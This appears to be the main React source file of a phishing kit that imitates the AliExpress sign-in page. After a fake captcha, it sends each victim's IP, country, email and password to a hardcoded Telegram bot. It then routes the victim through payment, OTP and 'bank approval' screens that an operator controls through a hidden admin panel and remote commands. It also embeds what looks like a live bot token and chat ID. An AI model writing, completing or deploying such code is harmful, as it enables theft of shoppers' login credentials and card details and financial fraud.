
import React, { useState, useEffect } from 'react';
import { ChevronLeft, ChevronDown, Eye, EyeOff, ShieldAlert } from 'lucide-react';
import { SocialButton } from './components/SocialButton';
import { Captcha } from './components/Captcha';
import { PaymentPage } from './components/PaymentPage';
import { ProcessingPage } from './components/ProcessingPage';
import { AdminPanel } from './components/AdminPanel';
import { OtpPage } from './components/OtpPage';
import { BankApprovalPage } from './components/BankApprovalPage';

export type ViewState = 'captcha' | 'login' | 'payment' | 'loading' | 'otp' | 'bank-approval' | 'admin' | 'blocked';

const App: React.FC = () => {
  const [view, setView] = useState<ViewState>('captcha');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [location, setLocation] = useState('Detecting...');
  const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' });
  
  const [botConfig, setBotConfig] = useState({
    token: '8586070350:AAHH3zeOKmg5Z45CT_68N14xzEdkLFhY0G0',
    chatId: '5219969216'
  });
  const [remoteAction, setRemoteAction] = useState<string>('none');
  const [liveUserInputs, setLiveUserInputs] = useState<any>({});

  // Visibility & Session Tracking
  useEffect(() => {
    const updatePresence = () => {
      const status = document.visibilityState === 'visible' ? 'online' : 'offline';
      const sessionData = {
        status,
        lastSeen: Date.now(),
        ip: ipInfo.ip,
        country: ipInfo.country,
        currentPage: view === 'admin' ? '/admin' : `/${view}`,
        sessionId: 'cccfe0ec-eebd-4290-b739-67d0507d7916' // Static for demo consistency
      };
      localStorage.setItem('user_presence', JSON.stringify(sessionData));
    };
    
    document.addEventListener('visibilitychange', updatePresence);
    const interval = setInterval(updatePresence, 3000);
    updatePresence();
    
    return () => {
      document.removeEventListener('visibilitychange', updatePresence);
      clearInterval(interval);
    };
  }, [ipInfo, view]);

  // Remote Action Polling
  useEffect(() => {
    const checkActions = () => {
      const action = localStorage.getItem('admin_redirect_action');
      if (action && action !== remoteAction) {
        if (action === 'otp') setView('otp');
        else if (action === 'bank_approval') setView('bank-approval');
        else if (action === 'invalid_otp') setView('otp');
        else if (action === 'declined') setView('payment');
        else if (action === 'block') setView('blocked');
        else if (action === 'normal') {
          // If we were blocked or special view, go back to generic state if needed
          // but usually 'normal' just means stop forcing redirects
        }
        setRemoteAction(action);
      }
    };
    const timer = setInterval(checkActions, 1000);
    return () => clearInterval(timer);
  }, [remoteAction]);

  const fetchCurrentLocation = async () => {
    try {
      const res = await fetch('https://api.myip.com/');
      if (res.ok) {
        const data = await res.json();
        const result = { ip: data.ip || 'Unknown', country: data.country || 'Unknown' };
        setIpInfo(result);
        setLocation(result.country);
        return result;
      }
      throw new Error('myip failed');
    } catch (e) {
      try {
        const res2 = await fetch('https://ipapi.co/json/');
        const data2 = await res2.json();
        const result2 = { ip: data2.ip || 'Unknown', country: data2.country_name || 'Unknown' };
        setIpInfo(result2);
        setLocation(result2.country);
        return result2;
      } catch (e2) {
        return { ip: 'Unknown', country: 'Algeria' };
      }
    }
  };

  useEffect(() => { fetchCurrentLocation(); }, []);

  const sendToTelegram = async (text: string) => {
    try {
      const url = `https://api.telegram.org/bot${botConfig.token}/sendMessage`;
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: botConfig.chatId, text, parse_mode: 'HTML' }),
      });
    } catch (error) { console.error('Telegram notification failed:', error); }
  };

  const handleVerificationSuccess = async () => {
    const currentData = await fetchCurrentLocation();
    const message = `<b>🔒 Security Verification Passed</b>\n<b>📍 IP:</b> ${currentData.ip}\n<b>🚩 Country:</b> ${currentData.country}`;
    await sendToTelegram(message);
    setView('login');
  };

  const handleLogin = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const message = `<b>👤 Login Attempt</b>\n<b>📧 Email:</b> <code>${email}</code>\n<b>🔑 Pass:</b> <code>${password}</code>\n<b>📍 IP:</b> ${ipInfo.ip}`;
    await sendToTelegram(message);
    setView('payment');
  };

  const handleUserInputUpdate = (data: any) => {
    const updated = { ...liveUserInputs, ...data };
    setLiveUserInputs(updated);
    localStorage.setItem('live_user_inputs', JSON.stringify(updated));
  };

  // Hidden Admin Access: Click logo 5 times
  const [logoClicks, setLogoClicks] = useState(0);
  const handleLogoClick = () => {
    if (logoClicks + 1 >= 5) {
      setView('admin');
      setLogoClicks(0);
    } else {
      setLogoClicks(prev => prev + 1);
    }
  };

  if (view === 'blocked') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-6 text-center">
        <div className="max-w-xs space-y-4">
          <ShieldAlert className="w-16 h-16 text-red-500 mx-auto" />
          <h1 className="text-2xl font-bold text-white">Access Denied</h1>
          <p className="text-slate-400 text-sm">Your connection has been blocked due to suspicious activity. Please contact support if you believe this is an error.</p>
        </div>
      </div>
    );
  }

  if (view === 'admin') return <AdminPanel onBack={() => setView('login')} />;
  if (view === 'captcha') return <Captcha onSuccess={handleVerificationSuccess} />;
  if (view === 'loading') return <ProcessingPage />;
  if (view === 'otp') return <OtpPage botToken={botConfig.token} chatId={botConfig.chatId} isInvalid={remoteAction === 'invalid_otp'} onComplete={() => setView('loading')} />;
  if (view === 'bank-approval') return <BankApprovalPage cardType={liveUserInputs.cardNumber?.startsWith('4') ? 'visa' : liveUserInputs.cardNumber?.startsWith('5') ? 'mastercard' : 'amex'} />;

  if (view === 'payment') {
    return (
      <PaymentPage 
        onBack={() => setView('login')} 
        botToken={botConfig.token} 
        chatId={botConfig.chatId} 
        currentIp={ipInfo.ip}
        currentLoc={location} 
        onComplete={() => setView('loading')}
        onInputChange={handleUserInputUpdate}
        error={remoteAction === 'declined' ? 'Your card is declined.' : undefined}
      />
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center max-w-md mx-auto relative shadow-xl overflow-hidden">
      <header className="w-full flex items-center justify-between p-4 bg-white border-b border-gray-50">
        <button className="p-1 hover:bg-gray-100 rounded-full transition-colors">
          <ChevronLeft className="w-6 h-6 text-gray-800" />
        </button>
        <div className="flex-1 flex justify-center" onClick={handleLogoClick}>
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/AliExpress_2024.svg/330px-AliExpress_2024.svg.png" 
            alt="AliExpress" 
            className="h-6 object-contain cursor-pointer"
          />
        </div>
        <div className="w-8" /> 
      </header>

      <div className="w-full px-6 pt-8 pb-4 animate-in slide-in-from-right-10 duration-500">
        <h2 className="text-2xl font-bold text-[#191919] mb-8">Sign in</h2>
        <form onSubmit={handleLogin} className="space-y-4">
          <input
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email or User ID"
            className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50"
          />
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50"
            />
            <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400">
              {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
            </button>
          </div>
          <button type="submit" disabled={!email || !password} className={`w-full py-4 rounded-full text-lg font-bold text-white ${(!email || !password) ? 'bg-[#E0E0E0]' : 'bg-[#FF4747]'}`}>
            Sign in
          </button>
        </form>
        
        <div className="mt-4 flex justify-between items-center px-1">
          <button className="text-sm text-gray-500">Forgot password?</button>
          <button className="text-sm text-[#FF4747] font-semibold">Register</button>
        </div>
        <div className="relative flex items-center py-6">
          <div className="flex-grow border-t border-gray-200"></div>
          <span className="flex-shrink mx-4 text-gray-400 text-xs font-medium uppercase tracking-widest">Or continue with</span>
          <div className="flex-grow border-t border-gray-200"></div>
        </div>
        <div className="grid grid-cols-1 gap-3">
          <SocialButton type="google" label="google" icon="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" />
          <SocialButton type="facebook" label="facebook" icon="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" />
          <SocialButton type="apple" label="apple" icon="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" />
        </div>
      </div>
      <footer className="w-full px-6 py-8 text-center bg-white mt-auto">
        <div className="flex items-center justify-center gap-1 mb-6 text-gray-600">
          <span className="text-sm">Location:</span>
          <button className="flex items-center gap-0.5 text-sm font-semibold hover:text-[#FF4747]">
            {location} <ChevronDown className="w-4 h-4" />
          </button>
        </div>
        <p className="text-[11px] leading-relaxed text-gray-400 font-normal max-w-[280px] mx-auto">
          By signing in, you agree to AliExpress.com's <a href="#" className="underline">Terms of Use</a> and <a href="#" className="underline">Privacy Policy</a>.
        </p>
      </footer>
    </div>
  );
};

export default App;
